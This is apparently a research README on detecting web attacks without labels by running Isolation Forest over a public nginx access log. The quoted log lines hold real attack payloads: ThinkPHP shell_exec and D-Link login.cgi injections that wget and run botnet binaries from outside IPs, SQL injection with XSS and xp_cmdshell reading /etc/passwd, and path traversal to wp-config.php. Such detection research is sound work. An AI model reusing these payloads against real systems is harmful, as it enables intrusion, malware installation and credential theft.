# Walu(Web Application Log Unveiler)

https://www.scutum.jp/information/waf_tech_blog/2021/01/waf-blog-077.html
 
This is a memo of the result of own research from the above Blog(WAF Tech Blog).

We want to detect an attack without labeling. For that purpose, A data away from the "normal" in an anomaly detection algorithm, that is "outliers", Let's define it as an attack. Isolation forest is used in the above Blog. The dataset is Access.log.zip at [Harvard Dataverse](https://dataverse.harvard.edu/dataset.xhtml?persistentId=doi:10.7910/DVN/3QBYB5). nginx has collected access logs for several days from January 2019 on a real shopping site in Iran. 10.36 million lines (3.3GB).

From the data extracted under the same conditions as the above Blog, I mappied 10000 randomly extracted data to two dimensions (Image 1). The graph shows that it is Scale-free. [ipynb/viz01.ipynb](ipynb/viz01.ipynb) [[mybinder.org](https://mybinder.org/v2/gh/kenjiaiko/Walu/main?filepath=ipynb%2Fviz01.ipynb)]

<img src="ipynb/t-SNE10000.jpg" width="300"> (Image 1)

Large clusters are judged to be normal in anomaly detection, so small clusters are "outliers". Because it is Scale-free, the (new) dataset with all large clusters removed is also Scale-free. And the Isolation forest is applied it again, further outliers will be calculated. If you set the threshold to 0.25 and apply the Isolation forest twice...

```
$ ./run.sh 2 0.25
```

```
$ head -n 2 data/result_by_ip.txt
0.186 185.222.202.118 - - [22/Jan/2019:09:15:46 +0330] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://185.222.202.118/bins/rift.x86;cat%20rift.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp HTTP/1.1" 301 178 "-" "python-requests/2.4.3 CPython/2.7.9 Linux/3.16.0-4-amd64" "-"
0.188 62.210.157.10 - - [25/Jan/2019:21:20:36 +0330] "GET /wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" "-"
```

An attack access comes on the first and second lines. Lines 61 and 62 include SELECT and UNION.

```
0.261 176.121.14.183 - - [25/Jan/2019:12:07:57 +0330] "GET /image/29000?name=6aba3c.jpg&amp%3Bwh=200x200&HMCj%3D1300%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 1035 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4) Gecko/2008031317 Firefox/3.0b4" "-"
0.261 5.101.40.234 - - [23/Jan/2019:06:53:01 +0330] "GET /image/{{basketItem.id}}?type=productModel&wh=50x50&fhnz%3D1551%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24" "-"
```

Next, We consider the case of the features are not selected by experts. For example, when it features only Count of a specific character.

```
$ python printspchars.py > features.txt
$ ./run.sh 2 0.30
```

Suspicious access continues from the beginning, but it is clear attack from the 11th lines onwards.
 
```
0.204 108.61.86.94 - - [24/Jan/2019:13:08:01 +0330] "GET /login.cgi?cli=aa%20aa%27;wget%20http://108.61.86.94/bins/Solstice.mips%20-O%20->%20/tmp/.Solstice;chmod%20777%20/tmp/.Solstice;/tmp/.Solstice%20dlink%27$ HTTP/1.1" 400 166 "-" "Solstice/2.0" "-"
```

It is not so bad, however, the access that was on the second line earlier is on the 107th line: a score of 0.344, which is quite late.

```
0.344 62.210.157.10 - - [25/Jan/2019:21:20:36 +0330] "GET /wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" "-"
```

Of course, it is better for experts to set the features, but it seems that even appropriate features will give good results (to the extent that they do not interfere with the analysis).

### Analysis

- Sample code (python). [ipynb/viz02.ipynb](ipynb/viz02.ipynb)
- Repeat the Isolation forest for 10.36 million rows of unlabeled data.
- Extract the access with the highest score for each IP. 742 lines. [ipynb/result_by_ip.txt](ipynb/result_by_ip.txt)
- Humans confirm 742 lines.

If all the outliers are truly attacks, this is OK, but of course this is not the case, so humans will check from here. The first 29 lines of [ipynb/result_by_ip.txt](ipynb/result_by_ip.txt) are followed by rapidGrails/jsonList requests. Well it wouldn't be an attack. And on line 30, a clear attack is found.
 
 ```
-0.7341514235140854 202.70.250.38 - - [24/Jan/2019:15:58:56 +0330] GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\x00 400 166 - - -
```

The first pattern is the attack to do "shell_exec" and "wget" to index.php. You can find more than one(lines 32-50). Let this be pattern1.

```
-0.7335728824690786 176.121.14.183 - - [25/Jan/2019:12:07:57 +0330] GET /image/29000?name=6aba3c.jpg&amp%3Bwh=200x200&HMCj%3D1300%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1 200 1035 - Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4) Gecko/2008031317 Firefox/3.0b4 -
```

Then the 51th line, Contains UNION, SELECT, script and alert. Access apparently intended for attack. This is pattern2. After that, pattern1 follows, and pattern2 appears again on line 126 and line 206.

```
-0.6859619404158754 151.25.29.64 - - [22/Jan/2019:05:55:47 +0330] GET /login.cgi?cli=aa%20aa%27;wget%20http://217.61.5.226/bins/Solstice.mips%20-O%20->%20/tmp/.Solstice;chmod%20777%20/tmp/.Solstice;/tmp/.Solstice%20dlink%27$ HTTP/1.1 400 166 - Solstice/2.0 -
```

Contains login.cgi and wget. This is pattern3.

```
-0.6626657948031308 37.137.14.150 - - [22/Jan/2019:16:09:03 +0330] GET /m/product/33487/64141/%D8%AC%D8%A7%D8%B1%D9%88%D8%A8%D8%B1%D9%82%DB%8C-%D8%A8%D8%A7-%D9%BE%D8%A7%DA%A9%D8%AA-%D8%A8%D9%88%D8%B4-%D9%85%D8%AF%D9%84-BGL8PRO5IR%22%3E%3Cdiv%20class%3D%22kharid-khoob%22style%3D%22background-image%3A%20url%28%2FdiscountLabel%2Fget%2F3?utm_content=2005&utm_medium=26&utm_campaign=GPB&utm_term=209&type=desktopSmallIcon%29%3Bwidth%3A75px%3Bheight%3A77px%3B%3Futm_source%3D6 HTTP/1.1 404 211 https://www.garda.ir/%D9%84%D9%88%D8%A7%D8%B2%D9%85-%D8%AE%D8%A7%D9%86%DA%AF%DB%8C-%D9%88-%D8%A2%D8%B4%D9%BE%D8%B2%D8%AE%D8%A7%D9%86%D9%87/%D8%AC%D8%A7%D8%B1%D9%88-%D8%A8%D8%B1%D9%82%DB%8C/%D8%AC%D8%A7%D8%B1%D9%88-%D8%A8%D8%B1%D9%82%DB%8C-%D8%A8%D9%88%D8%B4/%D8%AC%D8%A7%D8%B1%D9%88%D8%A8%D8%B1%D9%82%DB%8C-%D8%A8%D8%A7-%D9%BE%D8%A7%DA%A9%D8%AA-%D8%A8%D9%88%D8%B4-%D9%85%D8%AF%D9%84-BGL8PRO5IR-214503 Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1 -
```

```
-0.6582348010972741 2.183.9.23 - - [23/Jan/2019:10:36:16 +0330] GET /image/29/productTypeTy%3C/div%3E%3Cstyle%3E.notFoundList%20%7Bdisplay:%20block;padding-top:%2010px;%7D.notFoundList%20li%20%7Blist-style:%20none;display:%20inline-block;margin:%205px;%7D.notFoundList%20a%20%7Blist-style:%20none;background:%20 HTTP/1.1 200 11 https://www.zanbil.ir/filter/b136,b261,b74,p5 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 -
```

Line 230, /m/product/ with div tag. pattern4. Line 242, closed with /div tag. pattern4 variant.

```
-0.6057850284293474 62.210.157.10 - - [25/Jan/2019:21:20:36 +0330] GET /wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php HTTP/1.1 301 178 - Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 -
```

```
-0.5928439132758191 104.249.46.47 - - [26/Jan/2019:18:30:49 +0330] GET /image/27458?name=...............1.jpg&wh=200x200 HTTP/1.1 200 5937 - Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko -
```

Line 304, ../wp-config.php. pattern5. name=....jpg. (Not an attack) is pattern5 variant.

The above is attack access. After that, you can devise a method to detect patterns 1 to 5.

If a label is attached, the rest can be learned by an appropriate algorithm. The challenge is how can "labeling" be automated? In the above, humans confirmed the last 742 lines, but if this can be fully automated, only attacks can be detected from the dataset. Of course, Isolation forest alone (or rather a single algorithm) would not be possible, finding a solution is a challenge.
